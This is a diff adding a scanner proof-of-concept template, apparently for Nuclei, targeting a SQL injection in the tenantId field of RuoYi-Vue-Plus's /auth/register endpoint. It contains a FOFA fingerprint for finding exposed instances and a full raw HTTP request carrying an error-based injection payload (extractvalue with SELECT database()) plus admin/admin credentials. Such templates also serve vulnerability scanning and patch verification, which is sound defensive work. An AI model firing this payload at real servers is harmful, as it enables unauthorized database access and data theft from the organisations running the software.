@@ -1,0 +1,19 @@
+id: poc-slop4zvcta25mf6w
+info:
+  name: RuoYi若依 Vue-Plus tenant_id存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/slop4zvcta25mf6w'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: slop4zvcta25mf6w
+    fofa: body="欢迎使用RuoYi-Vue-Plus后台管理框架" || body="RuoYi-Vue-Plus"
+http:
+- raw:
+  - "POST /auth/register HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: gzip\nConnection: keep-alive\nContent-Type: application/json\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36\n\n{\n \"clientId\": \"e5cd7e4891bf95d1d19206ce24a7b32e\",\n \"grantType\": \"password\",\n \"tenantId\": \"1' AND extractvalue(1,concat(0x7e,(SELECT database()))) AND '1'='1\",\n \"username\": \"admin\",\n \"password\": \"admin\"\n}"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
